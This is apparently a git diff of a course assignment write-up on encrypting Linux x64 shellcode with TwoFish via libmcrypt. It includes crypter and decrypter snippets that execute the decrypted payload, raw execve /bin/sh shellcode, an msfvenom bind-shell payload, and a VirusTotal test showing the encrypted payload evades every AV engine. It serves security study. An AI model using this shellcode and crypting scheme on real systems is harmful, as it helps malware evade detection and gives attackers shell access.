@@ -24,11 +24,14 @@ The password and IV that's used to encrypt, needs to be the same ones for the de
 Steps to follow for using `libmcrypt` in a C Programm are:
 
 1. Initialize `libmcrypt` to work with TwoFish in CFB mode. This is done with the `mcrypt_module_open` function, that returns a `MCRYPT` object that is saved as id_crypt 
+
 ```c
 MCRYPT id_crypt;
 id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL); 
 ```
+
 2. Generate a random IV of 16 bytes long 
+
 ```c
 int iv_size = mcrypt_enc_get_iv_size(id_crypt);   // Will return 16 bytes
 
@@ -36,21 +39,28 @@ for (int i = 0; i < iv_size; i++) {               // For each byte of the IV
     IV[i] = (unsigned char)rand();                // It is ramdomly generated
 } 
 ```
+
 3. Initialize the crypt (or decrypt) process for `mcrypt` for the id_crypt with the right password and generated IV 
+
 ```c
 mcrypt_generic_init(id_crypt, password, iv_size, IV); 
 ```
+
 4. Encrypt or decrypt a string (shellcode) 
+
 ```c
 // Crypt
 mcrypt_generic(id_crypt, code, code_length); 
 // DeCrypt
 mdecrypt_generic(id_crypt, code, code_length); 
 ```
+
 5. Close mcrypt id before exiting the programm 
+
 ```c
 mcrypt_generic_end(id_crypt); 
 ```
+
 For the assignment, two files are created:
 
 - [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) : This code crypts the shellcode. The shellcode is placed into a string in hex format. 
@@ -68,6 +78,7 @@ The code implements explained before to use `libmcrypt` to crypt the shellcode. 
 The code initializes the `libmcrypt`library to be used with TwoFish. Then generates the IV randomly using the `rand()` function after initializing the seed with `srand()` and `time()` functions and prints them along with the password in the screen. Then the shellcode is crypted and printed in C and ASM formats.
 
 The full code can be found in the [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment07) for this assignment:
+
 ```c 
 #include <stdio.h>
 #include <stdlib.h>
@@ -152,6 +163,7 @@ int main (void)
 	return(0);
 }
 ```
+
 ### DeCrypt: Twofish_Decrypter.c
 ---
 This code does exactly the same as before. Just that this time it decrypts the shellcode given. 
@@ -159,11 +171,14 @@ This code does exactly the same as before. Just that this time it decrypts the s
 > Decrypt needs the same password and IV used to crypt 
 
 The steps are the same as before. The program has the string containing the crypted shellcode in hex format, decrypts with the same password and IV used to crypt, and once this is done, runs the decrypted shellcode using the following code snippet:
+
 ```c
 	int (*ret)() = (int(*)())code;
 	ret();
 ```
+
 The full code can be found in the [TwoFish_Decrypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Decrypter.c) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment07) for this assignment:
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -250,6 +265,7 @@ int main (void)
 	ret();
 }
 ```
+
 ### Run Everything
 ---
 Let's try that everything works. Let's pick the Execve-Stack.nasm, generate it's shellcode, then Crypt it, the crypted shellcode will be placed in the Decrypt process and once decrypted, executed.
@@ -257,7 +273,8 @@ Let's try that everything works. Let's pick the Execve-Stack.nasm, generate it's
 #### Generate Execve Stack Shellcode
 
 Just compiling and using `objdump` the shellcode is generated:
-```markup
+
+```bash
 SLAE64> nasm -f elf64 Execve-Stack.nasm -o Execve-Stack.o
 SLAE64> echo “\"$(objdump -d Execve-Stack.o | grep '[0-9a-f]:' | 
               cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
@@ -267,16 +284,19 @@ SLAE64> echo “\"$(objdump -d Execve-Stack.o | grep '[0-9a-f]:' |
  
 SLAE64>
 ```
+
 <img src="https://galminyana.github.io/img/A07_Execve_Shellcode.png" width="75%" height="75%">
 
 #### Crypt the Shellcode
 
 This shellcode is placed in the `code[]` string in the TwoFish_Crypter.c file:
+
 ```c
 unsigned char code[]= \
 "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50"
 "\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
 ```
+
 Compile and run, and we get the following output:
 - The original shellcode and it's size in bytes
 - The Password used to crypt
@@ -306,12 +326,14 @@ Crypted Shellcode:
 
 SLAE64> 
 ```
+
 <img src="https://galminyana.github.io/img/A07_TwoFish_Crypter_Compile.png" width="75%" height="75%">
 
 #### Decrypt and Execute the Shellcode
 To decrypt, in the file TwoFish_Decrypter.c is needed to:
 - Put the hex value for the IV in the `IV[IV_SIZE]` string
 - Put the hex encrypted shellcode in the `code[]` string
+
 ```c
 unsigned char IV[IV_SIZE] = \
 "\xae\xf6\x9d\xac\xf7\xfa\x5e\xf1\x05\x4e\x79\x69\xc4\x38\x0a\xfa";
@@ -319,18 +341,22 @@ unsigned char IV[IV_SIZE] = \
 unsigned char code[]= \
 "\x33\x67\x20\x48\x7c\xcc\x09\x15\xbc\xbb\x12\x56\xfb\xe4\xfe\x74\xaf\x21\x38\x48\x48\x01\xe8\xee\x2c\x73\xa0\x1a\xe3\xba\x5c\xc4";
 ```
+
 > To compile, a part of the same flags used for `libmcrypt` the `-fno-stack-protector -z execstack` flags are needed too.
 
 Now let's compile the program as usual:
+
 ```bash
 SLAE64> gcc -L/usr/include -lmcrypt -fno-stack-protector -z execstack TwoFish_Decrypter.c -o TwoFish_Decrypter
 SLAE64> 
 ```
+
 And time to execute it. The output generated is:
 - The encrypted shellcode and it's size in bytes
 - The Password used to crypt
 - The generated IV in hex format for the encryption
 - The decrypted shellcode in ASM and C format. **_This shellcode has to be the same one as the original_**
+
 ```c 
 SLAE64> ./TwoFish_Decrypter 
 
@@ -355,6 +381,7 @@ root     tty7     :0               11:27   19:35   7.62s  7.62s /usr/lib/xorg/
 # exit
 SLAE64> 
 ```
+
 <img src="https://galminyana.github.io/img/A07_TwoFish_Decrypter_Exec.png" width="75%" height="75%">
 
 #### All OK
@@ -365,6 +392,7 @@ As can be seen, the code worked as expected. The shellcode been crypted, then de
 Came to my mind to test how efective the Crypt would be against detections systems (AV, IPS...). For that, [VirusTotal](https://www.virustotal.com/) is going to be used to check how much a `msfvenom` shellcode can be ofuscated.
 
 First, a `shell_bind_tcp` payload is created with `msfvenom`:
+
 ```bash
 SLAE64> msfvenom -p linux/x64/shell_bind_tcp RHOST=192.168.1.10 -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -381,24 +409,35 @@ unsigned char buf[] =
 "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
 SLAE64> 
 ```
+
 <img src="https://galminyana.github.io/img/A07_Demo01.png" width="75%" height="75%">
 
 #### Checking VirusTotal with `shellcode.c`
 This shellcode is placed in the `shellcode.c` template. 
 1. Code is compiled and the executable uploaded to VirusTotal:
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode01.png" width="45%" height="45%">
+
 2. VirusTotal analyzes it and the shellcode been detected by a total of 5 engines:
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode01_detected.png" width="75%" height="75%">
 
 #### Checking VirusTotal with the `TwoFish_Decrypter.c`
 To see if the encryption used is effective, the same is doing using the Crypt Schema used.
 1. The shellcode is placed in the `TwoFish_Crypter.c` file. Compiled and executed:
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode02.png" width="75%" height="75%">
+
 2. The encrypted shellcode, IV and password are placed in the `TwoFish_Decrypter.c` and compiled
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode03.png" width="75%" height="75%">
+
 3. The executable `./TwoFish_Decrypter` is uploaded to VirusTotal
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode04.png" width="45%" height="45%">
+
 4. And running the analysis, this time no AV engine detected the shellcode!
+
 <img src="https://galminyana.github.io/img/A07_VT_shellcode05.png" width="75%" height="75%">
 	
 ### GitHub Repo Files
